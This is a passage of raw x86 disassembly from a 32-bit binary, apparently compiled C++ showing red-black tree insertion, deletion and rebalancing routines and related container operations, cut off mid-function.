   1ac44:	push   DWORD PTR [ebp-0x4]
   1ac47:	lea    edi,[ebx+0x4]
   1ac4a:	push   DWORD PTR [ebp-0x8]
   1ac4d:	mov    esi,eax
   1ac4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ac50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ac51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ac52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ac53:	lea    ecx,[ebp-0x18]
   1ac56:	call   0x1a2fc
   1ac5b:	lea    edi,[ebx+0x14]
   1ac5e:	mov    esi,eax
   1ac60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ac61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ac62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ac63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ac64:	pop    edi
   1ac65:	pop    esi
   1ac66:	pop    ebx
   1ac67:	leave  
   1ac68:	ret    
   1ac69:	int3   
   1ac6a:	int3   
   1ac6b:	int3   
   1ac6c:	int3   
   1ac6d:	int3   
   1ac6e:	mov    edi,edi
   1ac70:	push   ebp
   1ac71:	mov    ebp,esp
   1ac73:	mov    eax,DWORD PTR [ebp+0xc]
   1ac76:	push   ebx
   1ac77:	push   esi
   1ac78:	push   edi
   1ac79:	lea    edi,[eax+0x4]
   1ac7c:	push   DWORD PTR [edi]
   1ac7e:	mov    ebx,ecx
   1ac80:	push   eax
   1ac81:	call   0x1a9e6
   1ac86:	push   DWORD PTR [ebp+0x10]
   1ac89:	mov    esi,eax
   1ac8b:	mov    DWORD PTR [edi],esi
   1ac8d:	mov    eax,DWORD PTR [esi+0x4]
   1ac90:	mov    DWORD PTR [eax],esi
   1ac92:	lea    eax,[esi+0x8]
   1ac95:	push   eax
   1ac96:	call   0x1a3a2
   1ac9b:	mov    eax,DWORD PTR [ebp+0x8]
   1ac9e:	inc    DWORD PTR [ebx+0x8]
   1aca1:	pop    edi
   1aca2:	mov    DWORD PTR [eax],esi
   1aca4:	pop    esi
   1aca5:	pop    ebx
   1aca6:	pop    ebp
   1aca7:	ret    0xc
   1acaa:	int3   
   1acab:	int3   
   1acac:	int3   
   1acad:	int3   
   1acae:	int3   
   1acaf:	int3   
   1acb0:	mov    edi,edi
   1acb2:	push   ebp
   1acb3:	mov    ebp,esp
   1acb5:	push   ecx
   1acb6:	mov    eax,DWORD PTR [ebp+0xc]
   1acb9:	push   esi
   1acba:	mov    esi,ecx
   1acbc:	jmp    0x1acd8
   1acbe:	add    eax,0x8
   1acc1:	push   eax
   1acc2:	push   DWORD PTR [ebp+0x8]
   1acc5:	lea    eax,[ebp-0x4]
   1acc8:	push   eax
   1acc9:	mov    ecx,esi
   1accb:	call   0x1ac6e
   1acd0:	mov    eax,DWORD PTR [ebp+0xc]
   1acd3:	mov    eax,DWORD PTR [eax]
   1acd5:	mov    DWORD PTR [ebp+0xc],eax
   1acd8:	cmp    eax,DWORD PTR [ebp+0x10]
   1acdb:	jne    0x1acbe
   1acdd:	pop    esi
   1acde:	leave  
   1acdf:	ret    0xc
   1ace2:	int3   
   1ace3:	int3   
   1ace4:	int3   
   1ace5:	int3   
   1ace6:	int3   
   1ace7:	int3   
   1ace8:	mov    edi,edi
   1acea:	push   ebp
   1aceb:	mov    ebp,esp
   1aced:	push   esi
   1acee:	push   edi
   1acef:	push   DWORD PTR [ebp+0xc]
   1acf2:	mov    edi,ecx
   1acf4:	call   0x1a626
   1acf9:	push   DWORD PTR [ebp+0xc]
   1acfc:	mov    ecx,edi
   1acfe:	mov    esi,eax
   1ad00:	call   0x1a5e6
   1ad05:	mov    ecx,DWORD PTR [ebp+0x8]
   1ad08:	pop    edi
   1ad09:	mov    DWORD PTR [ecx],eax
   1ad0b:	mov    DWORD PTR [ecx+0x4],esi
   1ad0e:	mov    eax,ecx
   1ad10:	pop    esi
   1ad11:	pop    ebp
   1ad12:	ret    0x8
   1ad15:	int3   
   1ad16:	int3   
   1ad17:	int3   
   1ad18:	int3   
   1ad19:	int3   
   1ad1a:	mov    edi,edi
   1ad1c:	push   ebp
   1ad1d:	mov    ebp,esp
   1ad1f:	push   ecx
   1ad20:	push   ebx
   1ad21:	push   esi
   1ad22:	push   edi
   1ad23:	push   0x1
   1ad25:	xor    edi,edi
   1ad27:	push   edi
   1ad28:	mov    esi,ecx
   1ad2a:	call   0x1396e
   1ad2f:	lea    ecx,[ebp-0x1]
   1ad32:	mov    ebx,eax
   1ad34:	call   DWORD PTR ds:0x7e11c
   1ad3a:	cmp    DWORD PTR ds:0x7fa94,edi
   1ad40:	jne    0x1ad55
   1ad42:	mov    eax,ebx
   1ad44:	mov    ds:0x7fa94,eax
   1ad49:	mov    DWORD PTR [eax],edi
   1ad4b:	mov    eax,ds:0x7fa94
   1ad50:	xor    ebx,ebx
   1ad52:	mov    DWORD PTR [eax+0x8],edi
   1ad55:	inc    DWORD PTR ds:0x7fa98
   1ad5b:	lea    ecx,[ebp-0x1]
   1ad5e:	call   DWORD PTR ds:0x7e118
   1ad64:	cmp    ebx,edi
   1ad66:	je     0x1ad6f
   1ad68:	push   ebx
   1ad69:	call   0x10a86
   1ad6e:	pop    ecx
   1ad6f:	push   edi
   1ad70:	push   DWORD PTR ds:0x7fa94
   1ad76:	mov    ecx,esi
   1ad78:	call   0x1396e
   1ad7d:	mov    DWORD PTR [esi+0xc],edi
   1ad80:	mov    DWORD PTR [esi+0x4],eax
   1ad83:	mov    DWORD PTR [eax],eax
   1ad85:	mov    esi,DWORD PTR [esi+0x4]
   1ad88:	pop    edi
   1ad89:	mov    DWORD PTR [esi+0x8],esi
   1ad8c:	pop    esi
   1ad8d:	pop    ebx
   1ad8e:	leave  
   1ad8f:	ret    
   1ad90:	int3   
   1ad91:	int3   
   1ad92:	int3   
   1ad93:	int3   
   1ad94:	int3   
   1ad95:	int3   
   1ad96:	mov    edi,edi
   1ad98:	push   ebp
   1ad99:	mov    ebp,esp
   1ad9b:	push   ebx
   1ad9c:	push   esi
   1ad9d:	mov    esi,DWORD PTR [ebp+0x10]
   1ada0:	push   edi
   1ada1:	push   0x0
   1ada3:	push   esi
   1ada4:	mov    edi,ecx
   1ada6:	call   0x1396e
   1adab:	push   DWORD PTR [ebp+0x14]
   1adae:	mov    ebx,eax
   1adb0:	mov    eax,ds:0x7fa94
   1adb5:	mov    DWORD PTR [ebx],eax
   1adb7:	mov    eax,ds:0x7fa94
   1adbc:	mov    DWORD PTR [ebx+0x8],eax
   1adbf:	lea    eax,[ebx+0xc]
   1adc2:	push   eax
   1adc3:	call   0x1a666
   1adc8:	inc    DWORD PTR [edi+0xc]
   1adcb:	cmp    esi,DWORD PTR [edi+0x4]
   1adce:	je     0x1adf8
   1add0:	mov    eax,DWORD PTR [ebp+0xc]
   1add3:	cmp    eax,DWORD PTR ds:0x7fa94
   1add9:	jne    0x1adf8
   1addb:	lea    eax,[esi+0xc]
   1adde:	push   eax
   1addf:	push   DWORD PTR [ebp+0x14]
   1ade2:	call   0x197f4
   1ade7:	test   al,al
   1ade9:	jne    0x1adf8
   1adeb:	mov    DWORD PTR [esi+0x8],ebx
   1adee:	mov    eax,DWORD PTR [edi+0x4]
   1adf1:	cmp    esi,DWORD PTR [eax+0x8]
   1adf4:	jne    0x1ae12
   1adf6:	jmp    0x1ae07
   1adf8:	mov    DWORD PTR [esi],ebx
   1adfa:	mov    eax,DWORD PTR [edi+0x4]
   1adfd:	cmp    esi,eax
   1adff:	jne    0x1ae0c
   1ae01:	mov    DWORD PTR [eax+0x4],ebx
   1ae04:	mov    eax,DWORD PTR [edi+0x4]
   1ae07:	mov    DWORD PTR [eax+0x8],ebx
   1ae0a:	jmp    0x1ae12
   1ae0c:	cmp    esi,DWORD PTR [eax]
   1ae0e:	jne    0x1ae12
   1ae10:	mov    DWORD PTR [eax],ebx
   1ae12:	mov    eax,DWORD PTR [edi+0x4]
   1ae15:	mov    esi,ebx
   1ae17:	cmp    ebx,DWORD PTR [eax+0x4]
   1ae1a:	je     0x1aece
   1ae20:	mov    eax,DWORD PTR [esi+0x4]
   1ae23:	xor    edx,edx
   1ae25:	cmp    DWORD PTR [eax+0x14],edx
   1ae28:	jne    0x1aece
   1ae2e:	mov    ecx,DWORD PTR [eax+0x4]
   1ae31:	cmp    eax,DWORD PTR [ecx]
   1ae33:	jne    0x1ae6f
   1ae35:	mov    ecx,DWORD PTR [ecx+0x8]
   1ae38:	cmp    DWORD PTR [ecx+0x14],edx
   1ae3b:	je     0x1ae76
   1ae3d:	cmp    esi,DWORD PTR [eax+0x8]
   1ae40:	jne    0x1ae4c
   1ae42:	mov    esi,eax
   1ae44:	push   esi
   1ae45:	mov    ecx,edi
   1ae47:	call   0x1a508
   1ae4c:	mov    eax,DWORD PTR [esi+0x4]
   1ae4f:	mov    DWORD PTR [eax+0x14],0x1
   1ae56:	mov    eax,DWORD PTR [esi+0x4]
   1ae59:	mov    eax,DWORD PTR [eax+0x4]
   1ae5c:	and    DWORD PTR [eax+0x14],0x0
   1ae60:	mov    eax,DWORD PTR [esi+0x4]
   1ae63:	push   DWORD PTR [eax+0x4]
   1ae66:	mov    ecx,edi
   1ae68:	call   0x1a556
   1ae6d:	jmp    0x1aec2
   1ae6f:	mov    ecx,DWORD PTR [ecx]
   1ae71:	cmp    DWORD PTR [ecx+0x14],edx
   1ae74:	jne    0x1ae93
   1ae76:	mov    edx,eax
   1ae78:	xor    eax,eax
   1ae7a:	inc    eax
   1ae7b:	mov    DWORD PTR [edx+0x14],eax
   1ae7e:	mov    DWORD PTR [ecx+0x14],eax
   1ae81:	mov    eax,DWORD PTR [esi+0x4]
   1ae84:	mov    eax,DWORD PTR [eax+0x4]
   1ae87:	and    DWORD PTR [eax+0x14],0x0
   1ae8b:	mov    eax,DWORD PTR [esi+0x4]
   1ae8e:	mov    esi,DWORD PTR [eax+0x4]
   1ae91:	jmp    0x1aec2
   1ae93:	cmp    esi,DWORD PTR [eax]
   1ae95:	jne    0x1aea1
   1ae97:	mov    esi,eax
   1ae99:	push   esi
   1ae9a:	mov    ecx,edi
   1ae9c:	call   0x1a556
   1aea1:	mov    eax,DWORD PTR [esi+0x4]
   1aea4:	mov    DWORD PTR [eax+0x14],0x1
   1aeab:	mov    eax,DWORD PTR [esi+0x4]
   1aeae:	mov    eax,DWORD PTR [eax+0x4]
   1aeb1:	and    DWORD PTR [eax+0x14],0x0
   1aeb5:	mov    eax,DWORD PTR [esi+0x4]
   1aeb8:	push   DWORD PTR [eax+0x4]
   1aebb:	mov    ecx,edi
   1aebd:	call   0x1a508
   1aec2:	mov    eax,DWORD PTR [edi+0x4]
   1aec5:	cmp    esi,DWORD PTR [eax+0x4]
   1aec8:	jne    0x1ae20
   1aece:	mov    eax,DWORD PTR [edi+0x4]
   1aed1:	mov    eax,DWORD PTR [eax+0x4]
   1aed4:	pop    edi
   1aed5:	mov    DWORD PTR [eax+0x14],0x1
   1aedc:	mov    eax,DWORD PTR [ebp+0x8]
   1aedf:	pop    esi
   1aee0:	mov    DWORD PTR [eax],ebx
   1aee2:	pop    ebx
   1aee3:	pop    ebp
   1aee4:	ret    0x10
   1aee7:	int3   
   1aee8:	int3   
   1aee9:	int3   
   1aeea:	int3   
   1aeeb:	int3   
   1aeec:	mov    edi,edi
   1aeee:	push   ebp
   1aeef:	mov    ebp,esp
   1aef1:	sub    esp,0x10
   1aef4:	push   ebx
   1aef5:	push   esi
   1aef6:	mov    DWORD PTR [ebp-0xc],ecx
   1aef9:	push   edi
   1aefa:	mov    edi,DWORD PTR [ebp+0xc]
   1aefd:	lea    ecx,[ebp+0xc]
   1af00:	call   0x1a36c
   1af05:	mov    esi,DWORD PTR [edi]
   1af07:	mov    eax,ds:0x7fa94
   1af0c:	lea    ebx,[edi+0x8]
   1af0f:	mov    DWORD PTR [ebp-0x8],edi
   1af12:	mov    DWORD PTR [ebp-0x10],ebx
   1af15:	cmp    esi,eax
   1af17:	jne    0x1af1d
   1af19:	mov    esi,DWORD PTR [ebx]
   1af1b:	jmp    0x1af34
   1af1d:	mov    ecx,DWORD PTR [ebx]
   1af1f:	cmp    ecx,eax
   1af21:	je     0x1af34
   1af23:	push   ecx
   1af24:	call   0x1a34a
   1af29:	mov    DWORD PTR [ebp-0x8],eax
   1af2c:	add    eax,0x8
   1af2f:	mov    esi,DWORD PTR [eax]
   1af31:	mov    DWORD PTR [ebp-0x10],eax
   1af34:	lea    ecx,[ebp-0x1]
   1af37:	call   DWORD PTR ds:0x7e11c
   1af3d:	mov    eax,DWORD PTR [ebp-0x8]
   1af40:	cmp    eax,edi
   1af42:	je     0x1afa4
   1af44:	mov    ecx,DWORD PTR [edi]
   1af46:	mov    DWORD PTR [ecx+0x4],eax
   1af49:	mov    ecx,DWORD PTR [edi]
   1af4b:	mov    DWORD PTR [eax],ecx
   1af4d:	cmp    eax,DWORD PTR [ebx]
   1af4f:	jne    0x1af56
   1af51:	mov    DWORD PTR [esi+0x4],eax
   1af54:	jmp    0x1af6d
   1af56:	mov    ecx,DWORD PTR [eax+0x4]
   1af59:	mov    edx,DWORD PTR [ebp-0x10]
   1af5c:	mov    DWORD PTR [esi+0x4],ecx
   1af5f:	mov    ecx,DWORD PTR [eax+0x4]
   1af62:	mov    DWORD PTR [ecx],esi
   1af64:	mov    ecx,DWORD PTR [ebx]
   1af66:	mov    DWORD PTR [edx],ecx
   1af68:	mov    ecx,DWORD PTR [ebx]
   1af6a:	mov    DWORD PTR [ecx+0x4],eax
   1af6d:	mov    ebx,DWORD PTR [ebp-0xc]
   1af70:	mov    ecx,DWORD PTR [ebx+0x4]
   1af73:	cmp    DWORD PTR [ecx+0x4],edi
   1af76:	jne    0x1af7d
   1af78:	mov    DWORD PTR [ecx+0x4],eax
   1af7b:	jmp    0x1af8b
   1af7d:	mov    ecx,DWORD PTR [edi+0x4]
   1af80:	cmp    DWORD PTR [ecx],edi
   1af82:	jne    0x1af88
   1af84:	mov    DWORD PTR [ecx],eax
   1af86:	jmp    0x1af8b
   1af88:	mov    DWORD PTR [ecx+0x8],eax
   1af8b:	mov    ecx,DWORD PTR [edi+0x4]
   1af8e:	mov    DWORD PTR [eax+0x4],ecx
   1af91:	mov    ecx,DWORD PTR [eax+0x14]
   1af94:	mov    edx,DWORD PTR [edi+0x14]
   1af97:	mov    DWORD PTR [eax+0x14],edx
   1af9a:	mov    DWORD PTR [edi+0x14],ecx
   1af9d:	mov    DWORD PTR [ebp-0x8],edi
   1afa0:	mov    eax,edi
   1afa2:	jmp    0x1b01d
   1afa4:	mov    ecx,DWORD PTR [eax+0x4]
   1afa7:	mov    edx,DWORD PTR [ebp-0xc]
   1afaa:	mov    DWORD PTR [esi+0x4],ecx
   1afad:	mov    ecx,DWORD PTR [edx+0x4]
   1afb0:	cmp    DWORD PTR [ecx+0x4],edi
   1afb3:	jne    0x1afba
   1afb5:	mov    DWORD PTR [ecx+0x4],esi
   1afb8:	jmp    0x1afc8
   1afba:	mov    ecx,DWORD PTR [edi+0x4]
   1afbd:	cmp    DWORD PTR [ecx],edi
   1afbf:	jne    0x1afc5
   1afc1:	mov    DWORD PTR [ecx],esi
   1afc3:	jmp    0x1afc8
   1afc5:	mov    DWORD PTR [ecx+0x8],esi
   1afc8:	mov    ecx,DWORD PTR [edx+0x4]
   1afcb:	mov    DWORD PTR [ebp-0x10],ecx
   1afce:	cmp    DWORD PTR [ecx],edi
   1afd0:	jne    0x1aff4
   1afd2:	mov    ebx,DWORD PTR [ebx]
   1afd4:	cmp    ebx,DWORD PTR ds:0x7fa94
   1afda:	jne    0x1afe3
   1afdc:	mov    ebx,DWORD PTR [edi+0x4]
   1afdf:	mov    DWORD PTR [ecx],ebx
   1afe1:	jmp    0x1aff4
   1afe3:	push   esi
   1afe4:	call   0x1a34a
   1afe9:	mov    ecx,DWORD PTR [ebp-0x10]
   1afec:	mov    edx,DWORD PTR [ebp-0xc]
   1afef:	mov    DWORD PTR [ecx],eax
   1aff1:	mov    eax,DWORD PTR [ebp-0x8]
   1aff4:	mov    ebx,DWORD PTR [edx+0x4]
   1aff7:	cmp    DWORD PTR [ebx+0x8],edi
   1affa:	jne    0x1b01a
   1affc:	mov    ecx,DWORD PTR [edi]
   1affe:	cmp    ecx,DWORD PTR ds:0x7fa94
   1b004:	jne    0x1b00e
   1b006:	mov    ecx,DWORD PTR [edi+0x4]
   1b009:	mov    DWORD PTR [ebx+0x8],ecx
   1b00c:	jmp    0x1b01a
   1b00e:	push   esi
   1b00f:	call   0x1a328
   1b014:	mov    DWORD PTR [ebx+0x8],eax
   1b017:	mov    eax,DWORD PTR [ebp-0x8]
   1b01a:	mov    ebx,DWORD PTR [ebp-0xc]
   1b01d:	xor    edi,edi
   1b01f:	inc    edi
   1b020:	cmp    DWORD PTR [eax+0x14],edi
   1b023:	jne    0x1b137
   1b029:	jmp    0x1b0ea
   1b02e:	cmp    DWORD PTR [esi+0x14],edi
   1b031:	jne    0x1b134
   1b037:	mov    eax,DWORD PTR [esi+0x4]
   1b03a:	cmp    esi,DWORD PTR [eax]
   1b03c:	jne    0x1b0b3
   1b03e:	mov    eax,DWORD PTR [eax+0x8]
   1b041:	cmp    DWORD PTR [eax+0x14],0x0
   1b045:	jne    0x1b061
   1b047:	mov    DWORD PTR [eax+0x14],edi
   1b04a:	mov    eax,DWORD PTR [esi+0x4]
   1b04d:	and    DWORD PTR [eax+0x14],0x0
   1b051:	push   DWORD PTR [esi+0x4]
   1b054:	mov    ecx,ebx
   1b056:	call   0x1a508
   1b05b:	mov    eax,DWORD PTR [esi+0x4]
   1b05e:	mov    eax,DWORD PTR [eax+0x8]
   1b061:	mov    ecx,DWORD PTR [eax]
   1b063:	cmp    DWORD PTR [ecx+0x14],edi
   1b066:	jne    0x1b070
   1b068:	mov    ecx,DWORD PTR [eax+0x8]
   1b06b:	cmp    DWORD PTR [ecx+0x14],edi
   1b06e:	je     0x1b0e3
   1b070:	mov    ecx,DWORD PTR [eax+0x8]
   1b073:	cmp    DWORD PTR [ecx+0x14],edi
   1b076:	jne    0x1b08f
   1b078:	mov    ecx,DWORD PTR [eax]
   1b07a:	mov    DWORD PTR [ecx+0x14],edi
   1b07d:	and    DWORD PTR [eax+0x14],0x0
   1b081:	push   eax
   1b082:	mov    ecx,ebx
   1b084:	call   0x1a556
   1b089:	mov    eax,DWORD PTR [esi+0x4]
   1b08c:	mov    eax,DWORD PTR [eax+0x8]
   1b08f:	mov    ecx,DWORD PTR [esi+0x4]
   1b092:	mov    ecx,DWORD PTR [ecx+0x14]
   1b095:	mov    DWORD PTR [eax+0x14],ecx
   1b098:	mov    ecx,DWORD PTR [esi+0x4]
   1b09b:	mov    DWORD PTR [ecx+0x14],edi
   1b09e:	mov    eax,DWORD PTR [eax+0x8]
   1b0a1:	mov    DWORD PTR [eax+0x14],edi
   1b0a4:	push   DWORD PTR [esi+0x4]
   1b0a7:	mov    ecx,ebx
   1b0a9:	call   0x1a508
   1b0ae:	jmp    0x1b134
   1b0b3:	mov    eax,DWORD PTR [eax]
   1b0b5:	cmp    DWORD PTR [eax+0x14],0x0
   1b0b9:	jne    0x1b0d4
   1b0bb:	mov    DWORD PTR [eax+0x14],edi
   1b0be:	mov    eax,DWORD PTR [esi+0x4]
   1b0c1:	and    DWORD PTR [eax+0x14],0x0
   1b0c5:	push   DWORD PTR [esi+0x4]
   1b0c8:	mov    ecx,ebx
   1b0ca:	call   0x1a556
   1b0cf:	mov    eax,DWORD PTR [esi+0x4]
   1b0d2:	mov    eax,DWORD PTR [eax]
   1b0d4:	mov    ecx,DWORD PTR [eax+0x8]
   1b0d7:	cmp    DWORD PTR [ecx+0x14],edi
   1b0da:	jne    0x1b0f8
   1b0dc:	mov    ecx,DWORD PTR [eax]
   1b0de:	cmp    DWORD PTR [ecx+0x14],edi
   1b0e1:	jne    0x1b0f8
   1b0e3:	and    DWORD PTR [eax+0x14],0x0
   1b0e7:	mov    esi,DWORD PTR [esi+0x4]
   1b0ea:	mov    eax,DWORD PTR [ebx+0x4]
   1b0ed:	cmp    esi,DWORD PTR [eax+0x4]
   1b0f0:	jne    0x1b02e
   1b0f6:	jmp    0x1b134
   1b0f8:	mov    ecx,DWORD PTR [eax]
   1b0fa:	cmp    DWORD PTR [ecx+0x14],edi
   1b0fd:	jne    0x1b116
   1b0ff:	mov    ecx,DWORD PTR [eax+0x8]
   1b102:	mov    DWORD PTR [ecx+0x14],edi
   1b105:	and    DWORD PTR [eax+0x14],0x0
   1b109:	push   eax
   1b10a:	mov    ecx,ebx
   1b10c:	call   0x1a508
   1b111:	mov    eax,DWORD PTR [esi+0x4]
   1b114:	mov    eax,DWORD PTR [eax]
   1b116:	mov    ecx,DWORD PTR [esi+0x4]
   1b119:	mov    ecx,DWORD PTR [ecx+0x14]
   1b11c:	mov    DWORD PTR [eax+0x14],ecx
   1b11f:	mov    ecx,DWORD PTR [esi+0x4]
   1b122:	mov    DWORD PTR [ecx+0x14],edi
   1b125:	mov    eax,DWORD PTR [eax]
   1b127:	mov    DWORD PTR [eax+0x14],edi
   1b12a:	push   DWORD PTR [esi+0x4]
   1b12d:	mov    ecx,ebx
   1b12f:	call   0x1a556
   1b134:	mov    DWORD PTR [esi+0x14],edi
   1b137:	lea    ecx,[ebp-0x1]
   1b13a:	call   DWORD PTR ds:0x7e118
   1b140:	mov    esi,DWORD PTR [ebp-0x8]
   1b143:	lea    eax,[esi+0xc]
   1b146:	push   eax
   1b147:	call   0x1a684
   1b14c:	push   esi
   1b14d:	call   0x10a86
   1b152:	mov    eax,DWORD PTR [ebp+0x8]
   1b155:	dec    DWORD PTR [ebx+0xc]
   1b158:	pop    ecx
   1b159:	mov    ecx,DWORD PTR [ebp+0xc]
   1b15c:	pop    edi
   1b15d:	pop    esi
   1b15e:	mov    DWORD PTR [eax],ecx
   1b160:	pop    ebx
   1b161:	leave  
   1b162:	ret    0x8
   1b165:	int3   
   1b166:	int3   
   1b167:	int3   
   1b168:	int3   
   1b169:	int3   
   1b16a:	mov    edi,edi
   1b16c:	push   ebp
   1b16d:	mov    ebp,esp
   1b16f:	push   ebx
   1b170:	push   esi
   1b171:	push   edi
   1b172:	mov    edi,DWORD PTR [ebp+0x8]
   1b175:	mov    ebx,ecx
   1b177:	mov    esi,edi
   1b179:	cmp    edi,DWORD PTR ds:0x7fa94
   1b17f:	je     0x1b1a7
   1b181:	push   DWORD PTR [esi+0x8]
   1b184:	mov    ecx,ebx
   1b186:	call   0x1b16a
   1b18b:	mov    esi,DWORD PTR [esi]
   1b18d:	lea    eax,[edi+0xc]
   1b190:	push   eax
   1b191:	call   0x1a684
   1b196:	push   edi
   1b197:	call   0x10a86
   1b19c:	pop    ecx
   1b19d:	mov    edi,esi
   1b19f:	cmp    esi,DWORD PTR ds:0x7fa94
   1b1a5:	jne    0x1b181
   1b1a7:	pop    edi
   1b1a8:	pop    esi
   1b1a9:	pop    ebx
   1b1aa:	pop    ebp
   1b1ab:	ret    0x4
   1b1ae:	int3   
   1b1af:	int3   
   1b1b0:	int3   
   1b1b1:	int3   
   1b1b2:	int3   
   1b1b3:	int3   
   1b1b4:	mov    edi,edi
   1b1b6:	push   esi
   1b1b7:	mov    esi,ecx
   1b1b9:	jmp    0x1b1c2
   1b1bb:	mov    ecx,esi
   1b1bd:	call   0x1ab12
   1b1c2:	cmp    DWORD PTR [esi+0x2c],0x0
   1b1c6:	jne    0x1b1bb
   1b1c8:	pop    esi
   1b1c9:	ret    
   1b1ca:	int3   
   1b1cb:	int3   
   1b1cc:	int3   
   1b1cd:	int3   
   1b1ce:	int3   
   1b1cf:	int3   
   1b1d0:	mov    edi,edi
   1b1d2:	push   ebp
   1b1d3:	mov    ebp,esp
   1b1d5:	push   esi
   1b1d6:	mov    esi,ecx
   1b1d8:	cmp    DWORD PTR [esi+0x2c],0x0
   1b1dc:	je     0x1b204
   1b1de:	mov    ecx,DWORD PTR [esi+0x1c]
   1b1e1:	mov    edx,DWORD PTR [esi+0x18]
   1b1e4:	cmp    ecx,edx
   1b1e6:	je     0x1b204
   1b1e8:	push   DWORD PTR [ebp+0x8]
   1b1eb:	lea    eax,[ecx+0x4]
   1b1ee:	mov    DWORD PTR [esi+0x1c],eax
   1b1f1:	push   ecx
   1b1f2:	cmp    eax,edx
   1b1f4:	jne    0x1b218
   1b1f6:	call   0x1a3a2
   1b1fb:	mov    ecx,esi
   1b1fd:	call   0x1aba4
   1b202:	jmp    0x1b21d
   1b204:	mov    ecx,esi
   1b206:	call   0x1aba4
   1b20b:	mov    eax,DWORD PTR [esi+0x1c]
   1b20e:	push   DWORD PTR [ebp+0x8]
   1b211:	lea    ecx,[eax+0x4]
   1b214:	mov    DWORD PTR [esi+0x1c],ecx
   1b217:	push   eax
   1b218:	call   0x1a3a2
   1b21d:	inc    DWORD PTR [esi+0x2c]
   1b220:	pop    esi
   1b221:	pop    ebp
   1b222:	ret    0x4
   1b225:	int3   
   1b226:	int3   
   1b227:	int3   
   1b228:	int3   
   1b229:	int3   
   1b22a:	mov    edi,edi
   1b22c:	push   ebp
   1b22d:	mov    ebp,esp
   1b22f:	push   esi
   1b230:	push   0x0
   1b232:	push   0xc
   1b234:	mov    esi,ecx
   1b236:	call   0x11622
   1b23b:	mov    ecx,DWORD PTR [ebp+0x8]
   1b23e:	mov    DWORD PTR [eax],eax
   1b240:	mov    DWORD PTR [eax+0x4],eax
   1b243:	and    DWORD PTR [esi+0x8],0x0
   1b247:	mov    DWORD PTR [esi+0x4],eax
   1b24a:	mov    ecx,DWORD PTR [ecx+0x4]
   1b24d:	mov    edx,DWORD PTR [ecx]
   1b24f:	mov    eax,DWORD PTR [eax]
   1b251:	push   ecx
   1b252:	push   edx
   1b253:	push   eax
   1b254:	mov    ecx,esi
   1b256:	call   0x1acb0
   1b25b:	mov    eax,esi
   1b25d:	pop    esi
   1b25e:	pop    ebp
   1b25f:	ret    0x4
   1b262:	int3   
   1b263:	int3   
   1b264:	int3   
   1b265:	int3   
   1b266:	int3   
   1b267:	int3   
   1b268:	mov    edi,edi
   1b26a:	push   ebp
   1b26b:	mov    ebp,esp
   1b26d:	push   ecx
   1b26e:	mov    edx,DWORD PTR [ebp+0x8]
   1b271:	mov    DWORD PTR [ebp-0x4],ecx
   1b274:	cmp    ecx,edx
   1b276:	je     0x1b2b5
   1b278:	push   ebx
   1b279:	mov    ebx,DWORD PTR [edx+0x4]
   1b27c:	push   esi
   1b27d:	mov    esi,DWORD PTR [ecx+0x4]
   1b280:	mov    eax,DWORD PTR [esi]
   1b282:	push   edi
   1b283:	mov    edi,DWORD PTR [ebx]
   1b285:	jmp    0x1b295
   1b287:	cmp    edi,ebx
   1b289:	je     0x1b299
   1b28b:	mov    edx,DWORD PTR [edi+0x8]
   1b28e:	mov    DWORD PTR [eax+0x8],edx
   1b291:	mov    eax,DWORD PTR [eax]
   1b293:	mov    edi,DWORD PTR [edi]
   1b295:	cmp    eax,esi
   1b297:	jne    0x1b287
   1b299:	push   esi
   1b29a:	push   eax
   1b29b:	lea    eax,[ebp+0x8]
   1b29e:	push   eax
   1b29f:	call   0x1a9b0
   1b2a4:	mov    ecx,DWORD PTR [ebp-0x4]
   1b2a7:	push   ebx
   1b2a8:	push   edi
   1b2a9:	push   esi
   1b2aa:	call   0x1acb0
   1b2af:	mov    ecx,DWORD PTR [ebp-0x4]
   1b2b2:	pop    edi
   1b2b3:	pop    esi
   1b2b4:	pop    ebx
   1b2b5:	mov    eax,ecx
   1b2b7:	leave  
   1b2b8:	ret    0x4
   1b2bb:	int3   
   1b2bc:	int3   
   1b2bd:	int3   
   1b2be:	int3   
   1b2bf:	int3   
   1b2c0:	mov    edi,edi
   1b2c2:	push   ebp
   1b2c3:	mov    ebp,esp
   1b2c5:	push   DWORD PTR [ebp+0x8]
   1b2c8:	mov    eax,DWORD PTR [ecx+0x4]
   1b2cb:	push   eax
   1b2cc:	lea    eax,[ebp+0x8]
   1b2cf:	push   eax
   1b2d0:	call   0x1ac6e
   1b2d5:	pop    ebp
   1b2d6:	ret    0x4
   1b2d9:	int3   
   1b2da:	int3   
   1b2db:	int3   
   1b2dc:	int3   
   1b2dd:	int3   
   1b2de:	mov    edi,edi
   1b2e0:	push   ebp
   1b2e1:	mov    ebp,esp
   1b2e3:	push   ecx
   1b2e4:	push   ebx
   1b2e5:	push   esi
   1b2e6:	push   edi
   1b2e7:	mov    edi,ecx
   1b2e9:	mov    eax,DWORD PTR [edi+0x4]
   1b2ec:	mov    esi,DWORD PTR [eax+0x4]
   1b2ef:	mov    ebx,eax
   1b2f1:	mov    al,0x1
   1b2f3:	jmp    0x1b30e
   1b2f5:	lea    eax,[esi+0xc]
   1b2f8:	push   eax
   1b2f9:	push   DWORD PTR [ebp+0xc]
   1b2fc:	mov    ebx,esi
   1b2fe:	call   0x197f4
   1b303:	test   al,al
   1b305:	je     0x1b30b
   1b307:	mov    esi,DWORD PTR [esi]
   1b309:	jmp    0x1b30e
   1b30b:	mov    esi,DWORD PTR [esi+0x8]
   1b30e:	cmp    esi,DWORD PTR ds:0x7fa94
   1b314:	jne    0x1b2f5
   1b316:	cmp    BYTE PTR [edi+0x8],0x0
   1b31a:	je     0x1b337
   1b31c:	push   DWORD PTR [ebp+0xc]
   1b31f:	lea    eax,[ebp+0xc]
   1b322:	push   ebx
   1b323:	push   esi
   1b324:	push   eax
   1b325:	mov    ecx,edi
   1b327:	call   0x1ad96
   1b32c:	mov    ecx,DWORD PTR [eax]
   1b32e:	mov    eax,DWORD PTR [ebp+0x8]
   1b331:	mov    BYTE PTR [eax+0x4],0x1
